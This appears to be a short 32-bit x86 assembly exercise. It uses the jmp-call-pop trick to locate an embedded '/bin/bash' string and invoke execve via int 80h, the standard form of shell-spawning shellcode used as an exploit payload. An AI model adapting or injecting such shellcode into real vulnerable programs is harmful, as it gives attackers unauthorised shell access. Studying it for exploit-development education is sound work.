bits 32

jmp pre_args

run:
	; int kernel_execve(const char *filename, const char *const argv[], const char *const envp[]);
	pop ebx
  lea ecx, [ebx + 10]
  mov edx, 0

	mov [ecx], ebx
	mov [ecx+8], edx

	mov eax, 11
	int 80h
	jmp exit

pre_args:
	call run

	db '/bin/bash',0
	times 2 dq 1

exit:
